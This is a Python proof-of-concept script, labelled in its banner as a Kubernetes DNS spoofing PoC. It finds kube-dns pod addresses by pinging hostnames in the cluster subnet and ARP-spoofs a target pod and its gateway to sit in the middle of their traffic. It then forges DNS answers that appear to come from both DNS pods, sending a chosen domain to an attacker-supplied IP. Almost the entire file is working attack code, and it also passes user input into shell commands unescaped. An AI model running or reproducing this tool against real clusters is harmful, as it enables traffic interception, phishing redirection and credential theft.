from scapy.all import *
import time
import os
from threading import Thread
import socket

from termcolor import colored

DOMAINNAME = ''
REDIRECTEDIP = ''
DNSVIP = ''
DNSIPS = ['','']
TARGETIP = ''

DNS_SRC_PORT = 53

POD1_PACKET = IP()/UDP()/DNS()
GOT_RESPONSE = False
ARP_SPOOFING = True

def getmac(targetip):
	arppacket= Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=targetip)
	targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
	return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
    spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet, verbose=False)
    print colored('[arp-spoofing] ARP Table restored to normal for ' + targetip, 'blue')
    
def get_dns_ips(subnet):
    dnsips = []
    count = 0
    hypsubnet = subnet.replace('.', '-')
    for oct in range(1, 254):
        hostname = hypsubnet + str(oct) + '.kube-dns.kube-system.svc.cluster.local.'
        res = os.system('ping -c 1 ' + hostname + ' 2> /dev/null')
        if res == 0:
            dnsips.append(subnet + str(oct))
            count += 1
        if count == 2:
            return dnsips


def catch_respone_and_send_req(packet):
    if str(packet['DNS Question Record'].qname) == DOMAINNAME + '.default.svc.cluster.local.':
        packet_a = IP(src=DNSIPS[0], dst=TARGETIP)/UDP(sport=DNS_SRC_PORT, dport=packet[UDP].dport)/DNS()
        packet_b = IP(src=DNSIPS[1], dst=TARGETIP)/UDP(sport=DNS_SRC_PORT, dport=packet[UDP].dport)/DNS()
      
        packet_a[DNS] = POD1_PACKET[DNS]
        packet_b[DNS] = POD1_PACKET[DNS]
        
        packet_a[DNS].id = packet[DNS].id
        packet_b[DNS].id = packet[DNS].id


        packet_a[DNS].qd = packet[DNSQR]
        packet_b[DNS].qd = packet[DNSQR]
        
        dnsrr = POD1_PACKET[DNS].an
        dnsrr.rrname = packet[DNSQR].qname
        dnsrr.rdata = REDIRECTEDIP
        packet_a[DNS].an = dnsrr
        packet_b[DNS].an = dnsrr
        
        send(packet_a)
        send(packet_b)


def build_req_struct(packet):
    global GOT_RESPONSE, POD1_PACKET, ARP_SPOOFING
    if str(packet['DNS Question Record'].qname) == DOMAINNAME + '.':
        if packet[DNS].qr == 1 and not GOT_RESPONSE:
            GOT_RESPONSE = True
            POD1_PACKET = packet
            print colored('[*] Ready to spoof ' + DOMAINNAME + ' with ' + REDIRECTEDIP, 'green')
            sniff(filter='udp and port 53 and host ' + TARGETIP, prn=catch_respone_and_send_req, count=1)
            while 1:
                print colored('[?] Continue DNS spoofing attack (y/n)? ', 'yellow')
                if raw_input() == 'y':
                    sniff(filter='udp and port 53 and host ' + TARGETIP, prn=catch_respone_and_send_req, count=1)
                else:
                    ARP_SPOOFING = False
                    time.sleep(2)
                    print colored('[*] bye.', 'green')
                    os._exit(0)
   
   
def get_subnet(ip):
    octets = ip.split('.')
    return octets[0] + '.' + octets[1] + '.0.'
    
def arp_spoofing(targetip, gatewayip):
    try:
        targetmac= getmac(targetip)
        print colored('[arp-spoofing] Target MAC ' + targetmac, 'blue')
    except:
        print colored('[arp-spoofing] Target machine did not respond to ARP broadcast', 'red')
        exit()

    try:
        gatewaymac= getmac(gatewayip)
        print colored('[arp-spoofing] Gateway MAC: ' + gatewaymac, 'blue')
    except:
        print colored('[arp-spoofing] Gateway is unreachable', 'red')
        exit()
    
    print colored('[arp-spoofing] Sending spoofed ARP responses', 'blue')
    while ARP_SPOOFING:
        spoofarpcache(targetip, targetmac, gatewayip)
        spoofarpcache(gatewayip, gatewaymac, targetip)
    restorearp(gatewayip, gatewaymac, targetip, targetmac)
    restorearp(targetip, targetmac, gatewayip, gatewaymac)
    print colored('[arp-spoofing] ARP spoofing stopped', 'blue')


def get_dns_vip():
    return socket.gethostbyname('kube-dns.kube-system.svc.cluster.local.')
    

def run_nslookup_demo(domainname):
    time.sleep(1)
    os.system('nslookup '+ domainname + ' > /dev/null')

def print_logo():
    print colored("  _     ___        _____  _   _  _____                          __ _               _____   ____   _____ ", 'magenta', attrs=['bold'])
    print colored(" | |   / _ \      |  __ \| \ | |/ ____|                        / _(_)             |  __ \ / __ \ / ____|", 'magenta', attrs=['bold'])
    print colored(" | | _| (_) |___  | |  | |  \| | (___    ___ _ __   ___   ___ | |_ _ _ __   __ _  | |__) | |  | | |     ", 'magenta', attrs=['bold'])
    print colored(" | |/ /> _ </ __| | |  | | . ` |\___ \  / __| '_ \ / _ \ / _ \|  _| | '_ \ / _` | |  ___/| |  | | |     ", 'magenta', attrs=['bold'])
    print colored(" |   <| (_) \__ \ | |__| | |\  |____) | \__ \ |_) | (_) | (_) | | | | | | | (_| | | |    | |__| | |____ ", 'magenta', attrs=['bold'])
    print colored(" |_|\_\\\\___/|___/ |_____/|_| \_|_____/  |___/ .__/ \___/ \___/|_| |_|_| |_|\__, | |_|     \____/ \_____|", 'magenta', attrs=['bold'])
    print colored("                                            | |                             __/ |                       ", 'magenta', attrs=['bold'])
    print colored("                                            |_|                            |___/                        ", 'magenta', attrs=['bold'])

def main():
    global DOMAINNAME, REDIRECTEDIP, DNSVIP, DNSIPS, TARGETIP
    print_logo()
    
    print colored('[*] To get started, please enter the following data:', 'green')
    print colored('Enter Target IP: ', 'yellow')
    TARGETIP= raw_input()
    print colored('Enter Gateway IP: ', 'yellow')
    gatewayip= raw_input()
    print colored('Enter the domain name that will be spoofed (e.g google.com): ', 'yellow')
    DOMAINNAME= raw_input()
    print colored('Enter IP address of the spoofed DNS answer: ', 'yellow')
    REDIRECTEDIP= raw_input()
    
    
    print colored('[*] Scanning for DNS servers', 'green')
    DNSVIP = get_dns_vip()
    print colored('[*] DNS Virtual IP is - ' + DNSVIP, 'green')
    subnet = get_subnet(gatewayip)
    DNSIPS = get_dns_ips(subnet)
    print colored('[*] Found DNS Servers - ' + DNSIPS[0] + ', ' + DNSIPS[1], 'green')
        
    print colored('[*] Starting MITM attack', 'green')
    t = Thread(target=arp_spoofing, args=(TARGETIP,gatewayip))
    t.start()
    
    print colored('[*] run local nslookup to build packet structure', 'green')
    y = Thread(target=run_nslookup_demo, args=(DOMAINNAME,))
    y.start()
    sniff(filter="udp and port 53", prn=build_req_struct, count=8)


if __name__=='__main__':
    main()
